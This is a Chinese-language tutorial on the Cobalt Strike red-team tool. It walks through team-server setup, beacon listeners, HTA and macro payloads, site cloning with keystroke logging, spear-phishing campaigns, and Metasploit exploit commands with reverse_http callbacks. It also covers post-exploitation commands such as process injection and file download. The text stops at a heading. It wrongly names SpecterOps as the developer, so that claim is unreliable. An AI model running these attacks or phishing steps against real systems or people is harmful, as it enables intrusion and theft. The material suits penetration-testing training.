# Cobalt Strike 简介

Cobalt Strike 是一款商业级别的渗透测试工具，由美国外包安全公司 SpecterOps 开发，它可以用于模拟 APT 攻击，快速切入目标网络，为后续的攻击提供支持。
Cobalt Strike 提供了一系列强大的功能，包括端口转发、文件传输、虚假 URL、信息收集、命令与控制、模块化的恶意软件等等。同时，Cobalt Strike 还提供了一个可定制的绘图用户界面，使用户可以方便地控制和监控测试过程。
Cobalt Strike 通常用于渗透测试及红队演练，它支持多系统平台，包括 macOS、Linux 和 Windows 等，因此可以在各种不同的系统环境中进行渗透测试和漏洞利用。

# Cobalt Stirke 使用

## 基础操作

CS 需要 JDK 环境，kali 默认安装了 JDK 环境，如果是其他 Linux 系统，需要先安装 JDK 环境。

### 客户端与服务端的连接

Cobalt Strike 使用 C/S 架构，Cobalt Strike 的客户端连接到团队服务器，团队服务器连接到目标，也就是说 Cobalt Strike 的客户端不与目标服务器进行交互。

#### 开启团队服务器

Cobalt Strike的客户端想连接到团队服务器需要知道三个信息：

- 团队服务器的外部 IP 地址
- 团队服务器的连接密码
- （此项可选）决定 Malleable C2 工具的哪一个用户配置文件被用于团队服务器

知道这些信息后，就可以使用脚本开启团队服务器了。需要注意的是：**Cobalt Strike团队服务器只能运行在 Linux 环境下**。
开启团队服务器命令 ：

```
./teamserver your_ip your_passowrd [config_file]
```

进入 CS 所在目录

```
chmod 777 teamserver   # 为 teamserver 赋予权限
./teamserver 192.168.49.132 123456  # 运行 teamserver，IP 为 192.168.49.132 密码是 123456
```

#### 连接到团队服务器

新开一个窗口，运行 `./cobaltstrike`
填写主机名，端口为默认的 50050，填写刚刚设置的密码

![image-20240628162108701](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162108701.png)

点击 Yes 稍等片刻即可连接成功

#### 连接到多个团队服务器

Cobalt Strike 可以连接到过个团队服务器，这样就算其中一个团队服务器出现了问题，也不会导致整个行动失败。
点击左上角的 + 号就可以添加新的 teamserver。

![image-20240628162113769](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162113769.png)

### 分布式操作

这里介绍最基本的团队服务模型，具体由三个服务器构成：

- 临时服务器（Staging Servers） 临时服务器介于持久服务器和后渗透服务器之间，它的作用主要是方便在短时间内对目标系统进行访问。 它也是最开始用于传递payload、获取初始权限的服务器，它承担初始的权限提升和下载持久性程序的功能，因此这个服务器有较高暴露风险。
- 持久服务器（Long Haul Servers） 持久服务器的作用是保持对目标网络的长期访问，所以持久服务器会以较低的频率与目标保持通信。
- 后渗透服务器（Post-Exploitation Servers） 主要进行后渗透及横向移动的相关任务，比如对目标进行交互式访问

#### 可伸缩红队操作模型

可伸缩红队操作模型（Scaling Red Operations）分为两个层次，第一层次是针对一个目标网络的目标单元；第二层次是针对多个目标网络的权限管理单元。

**目标单元的工作**

- 负责具体目标或行动的对象
- 获得访问权限、后渗透、横向移动
- 维护本地基础设施

**访问管理单元的工作**

- 保持所有目标网络的访问权限
- 获取访问权限并接收来自单元的访问
- 根据需要传递对目标单元的访问
- 为持续回调保持全局基础环境

#### 团队角色

- 开始渗透人员 主要任务是进入目标系统，并扩大立足点
- 后渗透人员 主要任务是对目标系统进行数据挖掘、对用户进行监控，收集目标系统的密钥、日志等敏感信息
- 本地通道管理人员 主要任务有建立基础设施、保持shell的持久性、管理回调、传递全局访问管理单元之间的会话

#### 日志与报告

**日志记录**

Cobalt Strike的日志文件在团队服务器下的运行目录中的logs文件夹内，其中有些日志文件名例如beacon_11309.log，这里的11309就是beacon会话的ID。
按键的日志在keystrokes文件夹内，截屏的日志在screenshots文件夹内，截屏的日志名称一般如 screen_015321_4826.jpg 类似，其中015321表示时间（1点53分21秒），4826 表示 ID。

**导出报告**

Cobalt Strike生成报告的目的在于培训或帮助蓝队，在 Reporting 菜单栏中就可以生成报告，关于生成的报告有以下特点：

- 输出格式为PDF或者Word格式
- 可以输出自定义报告并且更改图标（Cobalt Strike –> Preferences –>Reporting）
- 可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正

**报告类型**

- 活动报告（Activity Report）
   - 此报告中提供了红队活动的时间表，记录了每个后渗透活动。
- 主机报告（Hosts Report）
   - 此报告中汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也会在此报告中。
- 侵害指标报告（Indicators of Compromise）
   - 此报告中包括对C2拓展文件的分析、使用的域名及上传文件的MD5哈希。
- 会话报告（Sessions Report）
   - 此报告中记录了指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。
- 社工报告（Social Engineering Report）
   - 此报告中记录了每一轮网络钓鱼的电子邮件、谁点击以及从每个点击用户那里收集的信息。该报告还显示了Cobalt Strike的System profiler发现的应用程序。
- 战术、技巧和程序报告（Tactics,Techniques,and Procedures）
   - 此报告将自己的Cobalt Strike行动映射到MITRE的ATT&CK矩阵中的战术，具体可参考[https://attack.mitre.org/](https://attack.mitre.org/)

## 基础设置

### 监听器

#### 什么是监听器

顾名思义，监听器就是等待被入侵系统连接自己的一个服务。
**监听器的作用**：主要是为了**接受 payload 回传的各类数据**，类似于 MSF 中 handler 的作用。比如 payload 在目标机器执行以后，就会回连到监听器然后下载执行真正的 shellcode 代码。一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境，接下来将深入了解如何准确配置监听器。
一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。
监听器的名字一般由以下结构组成：

```
// 操作系统/攻击载荷/传输器
Operating System/Payload/Stager
```

如：

```
windows/beacon_http/reverse_http
```

#### 什么是传输器

攻击载荷payload就是攻击执行的内容。攻击载荷通常被分为两部分：传输器stager 和传输体stage。
传输器stager是一个小程序，用于连接、下载传输体stage，并插入到内存中。
我个人理解为：攻击载荷里真正用于攻击的代码是在传输体里。
所以为什么要有传输体？直接把攻击载荷插入到内存中不更方便快捷、更香么，搞得又是传输器又是传输体的。
需要传输体是因为在很多攻击中对于能加载进内存，并在成功漏洞利用后执行的数据大小存在严格限制。这就导致在攻击成功时，很难嵌入额外的攻击载荷，正是因为这些限制，才使得传输器变得有必要了。

#### 创建监听器

在CS客户端中打开 Cobalt Strike --> Listeners，之后点击Add，此时弹出 New Listener 窗口，在填写监听器的相关信息之前，需要先来了解监听器有哪些类型。
Cobalt Strike有两种类型的监听器：
Beacon：Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理，笔者个人理解Beacon类型的监听器应该是平时比较常用的。
Beacon监听器的名称例如：

```
windows/beacon_http/reverse_http
```

Foreign：Foreign直译就是外部的，这里可以理解成对外监听器，这种类型的监听器主要作用是给其他的 Payload 提供别名，比如Metasploit 框架里的Payload，笔者个人理解Foreign监听器在一定程度上提高了 CS 的兼容性。
对外监听器的名称例如：

```
windows/foreign/reverse_https
```

### HTTP 和 HTTPS Beacon

Beacon 是什么

- Beacon 是 CS 的 Payload
- Beacon 有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon 回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。
- 通过 HTTP、HTTPS 和 DNS 出口网络
- 使用SMB协议的时候是点对点通信
- Beacon有很多的后渗透攻击模块和远程管理工具

Beacon的类型

- HTTP 和 HTTPS Beacon 
- HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。

```
windows/beacon_http/reverse_http
windows/beacon_https/reverse_https
```

- DNS Beacon

```
windows/beacon_dns/reverse_dns_txt
windows/beacon_dns/reverse_http
```

- SMB Beacon SMB Beacon 也可以叫做 pipe beacon

```
windows/beacon_smb/bind_pipe
```
创建一个 HTTP Beacon
点击 Cobalt Strike –> Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save

![image-20240628162123292](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162123292.png)

此时可以测试一下刚才设置的监听器，点击Attack –> Web Drive-by –> Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，最后点击Launch

![image-20240628162128991](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162128991.png)

![image-20240628162133093](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162133093.png)

复制弹窗的命令，放到靶机中运行

![image-20240628162136541](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162136541.png)
此时，回到CS，就可以看到已经靶机上线了

![image-20240628162140075](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162140075.png)

HTTPS Beacon
HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：[https://www.cobaltstrike.com/help-malleable-c2#validssl](https://www.cobaltstrike.com/help-malleable-c2#validssl)

### DNS Beacon

DNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。
在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。
DNS Beacon的工作流程具体如下：
首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。
原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。
根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon什么的会更慢。
域名配置
既然是配置域名，所以就需要先有个域名，添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。然后服务器配置防火墙将UDP的53端口放通。（这里我没有多余的服务器和域名，借用eastjun师傅的图）

![image-20240628162146019](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162146019.png)

配置完可以使用nslookup进行测试

![image-20240628162149731](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162149731.png)

CS中创建监听器时填写NS记录的域名：

![image-20240628162153128](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162153128.png)

靶机上线后不会像其他Beacon一样在第一次连接时就发送目标相关信息，在没有任务的情况下CS服务器都是简单响应DNS请求而不做任何操作，在执行任何一条命令之后靶机会将目标相关信息提交过来。

![image-20240628162157470](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162157470.png)

### SMB Beacon

SMB Beacon 使用命名管道通过一个父 Beacon 进行通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效。Windows 将命名管道通信封装在 SMB 协议中。因此得名 SMB Beacon。

![image-20240628162201999](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162201999.png)

因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效(系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败)。
SMB Beacon监听器对“提升权限”和“横向渗透”中很有用。
SMB Beacon 配置
首先需要一个上线的主机，这里我使用的HTTP Beacon。主机上线后，新建一个SMB Beacon，输入监听器名称，选择Beacon SMB，管道名称可以直接默认，也可以自定义。

![image-20240628162206275](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162206275.png)

接下来在Beacon中直接输入

```
spawn test_smb_beacon
```

这里的test_smb_beacon指代的是创建的SMB Beacon的监听器名称，也可以直接右击session，在Spawn选项中选择刚添加的SMB Beacon。

![image-20240628162210248](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162210248.png)

等待一会儿，就可以看到派生的SMB Beacon，在external中可以看到IP后有个∞∞字符。
此时SMB Beacon通过父级的HTTP Beacon与CS服务器进行通信，而SMB Beacon与HTTP Beacon通过SMB协议进行通信。
接下来我这里将SMB Beacon插入到进程中，以vmtoolsed进程为例。

![image-20240628162214206](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162214206.png)

在vmtoolsed中插入SMB Beacon后，便能看到process为vmtoolsed.exe的派生SMB Beacon。

![image-20240628162218321](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162218321.png)

在CS中，如果获取到目标的管理员权限，在用户名后会有*号标注。
连接与断开
此时如果想断开某个会话的连接，可以使用unlink命令，比如如果想断开192.168.175.144，就可以在Beacon中输入unlink 192.168.175.144
如果想再次连上，就直接输入link 192.168.175.144，想从当前主机连到其他主机也可以使用此命令。

### TCP Beacon

TCP Beacon与SMB Beacon类似，区别在于这里使用的是TCP协议与父级Beacon进行通信，使用这种方式上线时流量是不加密的。
在新建TCP Beacon时可以指定监听的端口：

![image-20240628162222288](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162222288.png)

在不出网的目标主机上执行后，目标主机会监听8888端口，然后父Beacon中使用connect命令进行连接：

![image-20240628162225922](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162225922.png)

### Foreign Beacon

使用Cobalt Strike外部监听器可以派生meterpreter会话，这里有Foreign HTTP和Foreign HTTPS两种监听器，其中Foreign HTTPS的流量是加密的。
首先msf起一个监听器：

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf exploit(handler) > set lhost 192.169.91.128
lhost => msf ip
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > exploit
```

然后CS里配置一下，填上msf服务器的ip和监听的端口

![image-20240628162232074](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162232074.png)

然后选择会话右键派生会话选择外部监听器

![image-20240628162235887](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162235887.png)

随后msf会接收到会话（最后这里没有复现成功)

## 目标攻击

### 客户端攻击

**什么是客户端攻击**

客户端攻击根据教程直译过来就是一种依靠应用程序使用控制端来进行的可视化攻击。

**为什么要进行客户端攻击**

随着时代发展到了今天，在有各种WAF、防火墙的情况下，各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。
而当我们发送一个钓鱼文件到客户端上，再由客户端打开这个文件，最后客户端穿过防火墙回连到我们，此时在客户端上我们就获得了一个立足点foothold。这样的一个过程是相对而言是较为容易的，这也是为什么要进行客户端攻击。

**如何获得客户端上的立足点**

1、尽可能多的了解目标环境，即做好信息收集工作
2、创建一个虚拟机，使它与目标环境尽可能的一致，比如操作系统、使用的浏览器版本等等都需要保证严格一致
3、攻击刚刚创建的虚拟机，这会是最好的攻击目标
4、精心策划攻击方法，达到使目标认为这些攻击行为都是正常行为的效果
5、将精心制作的钓鱼文件发送给目标，比如钓鱼邮件
如果这五步都非常细致精心的去准备，那么攻击成功的概率会大幅提升。

### 系统侦察

系统侦察System Profiler是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。
设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择System Profiler功能模块，配置待跳转的URL等信息即可。
如果勾选了Use Java Applet to get information则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。

![image-20240628162241329](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162241329.png)

配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察

```
1、View --> Applications
2、View --> Web Log
3、Cobalt Strike --> Visualization --> Target Table
```

目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。

![image-20240628162245928](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162245928.png)

值得注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。

### Cobalt Strike 的攻击方式

**用户驱动攻击**
用户驱动攻击User-Driven Attacks需要欺骗用户产生交互才行，但也有许多的优点。
首先用户驱动攻击不包含恶意攻击代码，所以用户系统上的安全补丁是没用的；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后因为用户驱动攻击十分可靠，也使得它很完美。
当我们采取行动来追踪并需要攻击时，它就像用户本地执行程序一样，CS为我们提供了几个用户驱动攻击的选项，分别如下：

### 用户驱动攻击包

用户驱动攻击包User-Driven Attacks Packages功能打开位置：Attacks --> Packages
**1、HTML应用**
HTML应用HTML Application生成(executable/VBA/powershell)这3种原理不同的VBScript实现的evil.hta文件。
**2、Microsoft Office 宏文件**
Microsoft Office 宏文件Microsoft Office Document Macros可以生成恶意宏放入office文件，非常经典的攻击手法。
**3、Payload 生成器**
Payload生成器Payload Generator可以生成各种语言版本的Payload，便于进行免杀。
**4、Windows 可执行文件**
Windows 可执行文件Windows Executable 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb)
**5、Windows 可执行文件（Stageless）**
Windows 可执行文件（Stageless）Windows Executable (Stageless)会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb)

### 用户驱动的Web交付攻击

用户驱动Web交付攻击User-Driven Web Drive-by Attacks功能打开位置：Attacks --> Web Drive-by
**1、java 签名 applet 攻击**
java 签名 applet 攻击Java Signed Applet Attack会启动一个Web服务以提供自签名Java Applet的运行环境，浏览器会要求用户授予applet运行权限，如果用户同意则实现控制，但目前该攻击方法已过时。
**2、Java 智能 Applet 攻击**
Java 智能 Applet 攻击Java Smart Applet Attack会自动检测Java版本并利用已知的漏洞绕过安全沙箱，但CS官方称该攻击的实现已过时，在现在的环境中无效。
**3、脚本化 Web 交付**
脚本化 Web 交付Scripted Web Delivery 为payload提供web服务以便于下载和执行，类似于MSF的Script Web Delivery
**4、托管文件**
托管文件Host File通过Attacks --> Web Drive-by --> Host File进行配置，攻击者可以通过这个功能将文件上传到CS服务端上，从而进行文件托管。
如果想删除上传到CS服务端上的文件，可以到Attacks --> Web Drive-by --> Manage下进行删除。
如果想查看谁访问了这些文件，可以到View --> Web Log下进行查看。

### 开始攻击

#### HTML 应用攻击
首先来到Attacks --> Packages --> HTML Application创建一个HTML应用，如果没有创建监听的话，还需要创建一个监听。

![image-20240628162252977](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162252977.png)

TML应用文件生成好后，来到Attacks --> Web Drive-by --> Host File，选择刚才生成的文件，最后点击Launch，复制CS创建的链接，在目标主机上打开此链接。

![image-20240628162257627](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162257627.png)

当在目标主机上提示是否运行时，点击运行。
当该文件在目标上运行后，CS客户端上就可以看到回连的会话了。

### MSF 与 CS 的结合利用

如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。
1、首先在MSF上选择攻击模块
2、接着在MSF上设置Payload为windows/meterpreter/reverse_http或者windows/meterpreter/reverse_https，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的。
3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口。
4、然后设置 DisablePayloadHandler 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了。
5、再设置 PrependMigrate 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。
6、最后运行exploit -j，-j 是指作为job开始运行，即在后台运行。
**操作**
在CS中新建一个HTTP Beacon，创建过程不再赘述。
1、在MSF中选择攻击模块，根据教程这里选择的adobe_flash_hacking_team_uaf模块，不过个人感觉现在这个模块已经不太能被利用成功了。

```
use exploit/multi/browser/adobe_flash_hacking_team_uaf
```

2、接着配置payload，这里选择revese_http payload

```
set payload windows/meterpreter/reverse_http
set LHOST cs_server_ip
set LPORT 80
```

3、之后，配置DisablePayloadHandler、PrependMigrate为 True

```
set DisablePayloadHandler True
set PrependMigrate True
```

4、最后，开始攻击。

```
exploit -j
```
![image-20240628162417510](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162417510.png)

5、结合克隆网站进行攻击。

### 伪装—克隆网站

在向目标发送漏洞程序之前，我们将自己进行伪装一下，这样可以更好的保护自己，同时提高成功率。CS上有个克隆网站的功能，能够较好的帮助到我们。
首先，来到Attacks --> Web Drive-by --> Clone Site下，打开克隆网站的功能，之后写入待克隆网站的URL，在Attack中写入MSF中生成的URL。
其中Log keystrokes on cloned site选项如果勾选则可以获取目标的键盘记录，记录结果在Web Log中能够查看。

![image-20240628162422537](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162422537.png)

之后，浏览器打开克隆站点地址，如果目标存在漏洞，就可以被利用了，同时在CS中也会观察到主机上线。

### 鱼叉式网络钓鱼

用CS进行钓鱼需要四个步骤：
1、创建一个目标清单
2、制作一个邮件模板或者使用之前制作好的模板
3、选择一个用来发送邮件的邮件服务器
4、发送邮件

**目标清单**
目标清单就是每行一个邮件地址的txt文件，即每行包含一个目标。
在一行中除了邮件地址也可以使用标签或一个名字。如果提供了名称，则有助于 Cobalt Strike 自定义每个网络钓鱼。
这里使用一些在线邮件接收平台的邮箱地址作为示例。

```
astrqb79501@chacuo.net    test1
gswtdm26180@chacuo.net    test2
ypmgin95416@chacuo.net    test3
```

将以上内容保存为txt文本文件，就创建好了自己的目标清单。
**模板**
使用模板的好处在于可以重复利用，制作钓鱼模板也很简单。可以先在邮箱中找一封广告邮件，查看邮件原始信息，一般在邮件的选项里能找到这个功能，然后导出为.eml文件作为模板。
**发送邮件**
有了目标和模板，然后选好自己的邮件服务器，之后就可以发送消息了。
在CS客户端中，点击Attacks --> Spear Phish即可打开网络钓鱼模块。添加上目标、模板、钓鱼地址、邮箱服务、退回邮箱，其中Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致，否则会报错。

![image-20240628162427571](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162427571.png)

所有信息添加完成后，可以点击Preview查看。如果感觉效果不错，就可以点击send发送了。
当目标收到钓鱼邮件，并且点击钓鱼邮件中的链接后，如果钓鱼链接配置的没有问题，CS就能够上线了。

## 后渗透

### Beacon 的管理

**Beacon 控制台**
在一个 Beacon 会话上右击 interact（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。

![image-20240628162433510](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162433510.png)

在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。
Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。
**Beacon 菜单**
Access：包含了一些对凭据的操作及提权的选项
Explore：包含了信息探测与目标交互的选项
Pivoting：包含了一些设置代理隧道的选项
Session：包含了对当前 Beacon 会话管理的选项
**Beacon 命令**

- help：查看 Beacon 命令的帮助信息。使用 help + 待查看帮助的命令可查看该命令的帮助信息。
- clear：清除 Beacon 命令队列。Beacon 是一个异步的 Payload，输入的命令并不会立即执行，而是当 Beacon 连接到团队服务器时再一一执行命令，因此当需要清除队列命令时就可以使用 clear 命令。
- sleep：改变 Beacon 的休眠时间。输入 sleep 30表示休眠30秒；输入sleep 60 50表示，随机睡眠 30秒至60秒，其中30秒 = 60 x 50%；如果输入 sleep 0则表示进入交互模式，任何输入的命令都会被立即执行，当输入一些命令，比如desktop时， Beacon 会自动进入交互模式。
- shell：通过受害主机的 cmd.exe 执行命令。比如运行ipconfig，就需要输入shell ipconfig
- run：不使用 cmd.exe 执行命令。该命令也是 run + 命令的形式运行，该命令会将执行结果回显。
- execute：执行命令，但不回显结果。
- cd：切换当前工作目录。
- pwd：查看当前所在目录。
- powershell：通过受害主机的 PowerShell 执行命令。比如想在 PowerShell 下运行 ipconfig，就需要输入powershell ipconfig
- powerpick：不使用 powershell.exe 执行 powershell 命令。这个命令依赖于由 Lee Christensen 开发的非托管 PowerShell 技术。powershell 和 powerpick 命令会使用当前令牌（ token ）。
- psinject：将非托管的 PowerShell 注入到一个特定的进程中并从此位置运行命令。
- powershell-import：导入 PowerShell 脚本到 Beacon 中。直接运行 powershell-import + 脚本文件路径即可，但是这个脚本导入命令一次仅能保留一个 PowerShell 脚本，再导入一个新脚本的时候，上一个脚本就被覆盖了，因此可以通过导入一个空文件来清空 Beacon 中导入的脚本。
- powershell get-help：获取 PowerShell 命令的相关帮助信息。比如想获取 PowerShell 下 get-process 命令的帮助，就需要输入powershell get-help get-process
- execute-assembly：将一个本地的 .NET 可执行文件作为 Beacon 的后渗透任务来运行。
- setenv：设置一个环境变量。

### 会话传递

**会话传递相关命令**
Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。

- spawn：进行会话的传递，也可直接右击会话选择spawn命令进行会话的选择。默认情况下，spawn命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用spawnto命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。
- spawnto：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入spawnto命令然后按 enter 会指示 Beacon 恢复至其默认行为。
- inject：输入inject + 进程 id + 监听器名来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用inject [pid] x64来将一个64位 Beacon 注入到一个 64位进程中。
- spawn和inject命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。
- dllinject：dllinject + [pid]来将一个反射性 DLL 注入到一个进程中。
- shinject：使用shinject [pid] [架构] [/路径/.../file.bin]命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。
- shspawn：使用shspawn [架构] [/路径/.../file.bin]命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。
- dllload：使用dllload [pid] [c:\路径\...\file.dll]来在另一个进程中加载磁盘上的 DLL文件。

**会话传递使用场景**
1、将当前会话传递至其他CS团队服务器中，直接右击spawn选择要传递的监听器即可。
2、将当前会话传递至MSF中，这里简单做一下演示。
首先，在MSF中，为攻击载荷新建一个payload

```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
msf5 exploit(multi/handler) > set lhost 192.168.175.156
msf5 exploit(multi/handler) > set lport 443
msf5 exploit(multi/handler) > exploit -j
```

随后，在CS中新建一个外部Foreign监听器，这里设置的监听IP与端口和MSF中的一致即可，随后在CS中利用spawn选择刚新建的外部监听器，MSF中即可返回会话。

### 文件系统

浏览会话系统文件位置在右击会话处，选择 Explore --> File Browser即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。
在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。

![image-20240628162441424](26.Cobalt%20Strike%20%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20240628162441424.png)

彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。

**文件下载**

- download：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。
- downloads：查看当前 Beacon 正在进行的文件下载列表。
- cancel：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。

下载文件都将下载到CS团队服务器中，在View --> Download下可看到下载文件的记录，选中文件后使用Sync Files即可将文件下载到本地。

**文件上传**

